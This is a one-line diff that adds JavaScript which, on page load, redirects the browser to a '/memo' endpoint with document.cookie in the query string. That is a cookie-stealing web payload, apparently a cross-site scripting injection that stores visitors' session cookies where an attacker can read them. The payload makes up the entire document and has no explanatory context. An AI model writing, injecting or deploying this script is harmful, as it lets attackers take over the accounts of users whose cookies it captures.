@@ -1,0 +1,1 @@
+window.addEventListener('load',function(){location.href='/memo?memo='+document.cookie})
